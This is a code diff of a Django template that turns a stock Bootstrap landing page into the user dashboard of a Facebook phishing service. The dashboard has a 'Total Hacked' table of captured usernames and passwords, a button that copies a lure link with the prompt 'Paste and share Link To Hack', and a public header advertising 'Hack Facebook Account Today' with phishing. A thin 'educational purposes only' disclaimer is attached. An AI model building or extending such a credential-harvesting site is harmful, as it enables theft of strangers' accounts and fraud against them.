@@ -1,114 +1,151 @@
-
+{% extends 'base.html' %}
 {% load static %}
-<!DOCTYPE html>
-<html lang="en">
 
-<head>
 
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="">
-  <meta name="author" content="">
+{% block body_block %}
+{% if user.is_authenticated %}
+<div class="row container">
+  <div class="container col-md-6" style="margin-top: 100px;">
+    <div class="card">
 
-  <title>Scrolling Nav - Start Bootstrap Template</title>
-
-  <!-- Bootstrap core CSS -->
-  <link href= '{% static "css/bootstrap.min.css" %}' rel="stylesheet">
-
-  <!-- Custom styles for this template -->
-  <link href="{% static 'css/scrolling-nav.css' %}" rel="stylesheet">
-
-</head>
-
-<body id="page-top">
-
-  <!-- Navigation -->
-  <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top" id="mainNav">
-    <div class="container">
-      <a class="navbar-brand js-scroll-trigger" href="#page-top">Start Bootstrap</a>
-      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
-        <span class="navbar-toggler-icon"></span>
-      </button>
-      <div class="collapse navbar-collapse" id="navbarResponsive">
-        <ul class="navbar-nav ml-auto">
-          <li class="nav-item">
-            <a class="nav-link js-scroll-trigger" href="#about">About</a>
-          </li>
-          <li class="nav-item">
-            <a class="nav-link js-scroll-trigger" href="#services">Services</a>
-          </li>
-          <li class="nav-item">
-            <a class="nav-link js-scroll-trigger" href="#contact">Contact</a>
-          </li>
-        </ul>
+      <div class="card-header bg-primary" style="font-weight: 900">
+        <h2>Total Hacked</h2>
       </div>
-    </div>
-  </nav>
+      <div class="card-body">
 
-  <header class="bg-primary text-white">
-    <div class="container text-center">
-      <h1>Welcome to Scrolling Nav</h1>
-      <p class="lead">A landing page template freshly redesigned for Bootstrap 4</p>
-    </div>
-  </header>
+        <table class="table table-primary table-bordered table-hover">
+          <thead class="thead-light">
+            <tr>
+              <th>Username</th>
+              <th>PassWord</th>
+            </tr>
+          </thead>
+          <tbody>
 
-  <section id="about">
-    <div class="container">
-      <div class="row">
-        <div class="col-lg-8 mx-auto">
-          <h2>About this page</h2>
-          <p class="lead">This is a great place to talk about your webpage. This template is purposefully unstyled so you can use it as a boilerplate or starting point for you own landing page designs! This template features:</p>
-          <ul>
-            <li>Clickable nav links that smooth scroll to page sections</li>
-            <li>Responsive behavior when clicking nav links perfect for a one page website</li>
-            <li>Bootstrap's scrollspy feature which highlights which section of the page you're on in the navbar</li>
-            <li>Minimal custom CSS so you are free to explore your own unique design options</li>
-          </ul>
+            <tr>
+
+              <td>mary@example.com</td>
+              <td>Mary</td>
+            </tr>
+
+          </tbody>
+        </table>
+      </div>
+
+
+    </div>
+
+  </div>
+
+  <div class="col-md-6" style="margin-top: 100px; margin-bottom: 280px;">
+    <div class="card">
+
+      <div class="card-header bg-primary" style="font-weight: 900">
+        <h2>Share Link</h2>
+      </div>
+      <div class="card-body">
+
+        <table class="table  table-bordered ">
+          <thead class="thead-dark">
+            <tr>
+              <th>SiteName</th>
+              <th>Link</th>
+            </tr>
+          </thead>
+          <tbody>
+
+            <tr>
+
+              <td>Facebook</td>
+              <td>
+                <a href="http://www.w3schools.com" target="#" id="fbLink">
+                  <img src="{% static 'fblogo.png'%}" style="width: 60px;height:54px;">
+                </a>
+
+                <button onclick="copyText()" class="btn btn-primary">Copy Link</button>
+              </td>
+            </tr>
+
+          </tbody>
+        </table>
+      </div>
+
+
+    </div>
+  </div>
+</div>
+{% else %}
+<header class="bg-primary text-white">
+  <div class="container text-center">
+    <h1>Hack Facebook Account Today</h1>
+    <p class="lead">A Easiest and Simplest Way Of Hacking Facebook Account With Phishing</p>
+    <a href="{% url 'credential:register'%}" class="btn btn-danger">SignUp Now</a>
+    <p>Already have Account <a href="{% url 'credential:user_login' %}"
+        style="color: red;font-size: 25px;font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif">Login</a></p>
+  </div>
+</header>
+
+<section id="declaimer" style="margin-top: -140px;">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 mx-auto">
+        <h2>Declaimer</h2>
+        <div class="lead">
+          Using of others facebook account Without him/her permissions is not legal. Main motive of making of this
+          website is <b>Informational</b> and <b>educational</b> purposes only.Any actions and or activities related to
+          the material contained within this Website is solely your responsibility. The misuse of the information in
+          this website can result in criminal charges brought against the persons in question. I will not be held
+          responsible in the event any criminal charges be brought against any individuals misusing the information in
+          this website to break the law.
         </div>
+        <p style="background-color: red;color: seashell">Note:This Is Only for Testing,Dont Share confidential
+          Information Like Real Username and
+          Password.We can Access All the information that You have shared Here.</p>
+
       </div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <section id="services" class="bg-light">
-    <div class="container">
-      <div class="row">
-        <div class="col-lg-8 mx-auto">
-          <h2>Services we offer</h2>
-          <p class="lead">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aut optio velit inventore, expedita quo laboriosam possimus ea consequatur vitae, doloribus consequuntur ex. Nemo assumenda laborum vel, labore ut velit dignissimos.</p>
-        </div>
+<section id="tutorial" class="bg-light">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 mx-auto">
+        <h2>Report</h2>
+        <p class="lead">Again, Making and providing this phishing site is informational and educational purposes only.In
+          Case,If anyone is using this Website for hacking purposes.Simply Report me .I will Delete the website. </p>
+        <a href="#" class="btn btn-primary">Report Here</a>
       </div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <section id="contact">
-    <div class="container">
-      <div class="row">
-        <div class="col-lg-8 mx-auto">
-          <h2>Contact us</h2>
-          <p class="lead">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero odio fugiat voluptatem dolor, provident officiis, id iusto! Obcaecati incidunt, qui nihil beatae magnam et repudiandae ipsa exercitationem, in, quo totam.</p>
-        </div>
+<section id="report">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 mx-auto">
+        <h2>Report To Us</h2>
+        <p class="lead">Again, Making and providing this phishing site is informational and educational purposes only.In
+          Case,It may anyone is using this Website for hacking purposes.Simply Report me .I will Delete the website.
+        </p>
+        <a href="#" class="btn btn-primary">Report Here</a>
       </div>
     </div>
-  </section>
+  </div>
+</section>
+{% endif %}
 
-  <!-- Footer -->
-  <footer class="py-5 bg-dark">
-    <div class="container">
-      <p class="m-0 text-center text-white">Copyright &copy; Your Website 2019</p>
-    </div>
-    <!-- /.container -->
-  </footer>
+{% endblock %}
 
-  <!-- Bootstrap core JavaScript -->
-  <script src='{% static "js/jquery.min.js" %}'></script>
-  <script src= '{% static "js/bootstrap.bundle.min.js" %}'></script>
+{% block js %}
+<script>
 
-  <!-- Plugin JavaScript -->
-  <script src='{% static "js/jquery.easing.min.js" %}'></script>
 
-  <!-- Custom JavaScript for this theme -->
-  <script src='{% static "js/scrolling-nav.js" %}'></script>
+  function copyText() {
+    let text = document.getElementById("fbLink").href
+    copied = navigator.clipboard.writeText(text);
+    alert("Link Copied || Paste and share Link  To Hack")
+  }
 
-</body>
-
-</html>
+</script>
+{% endblock %}
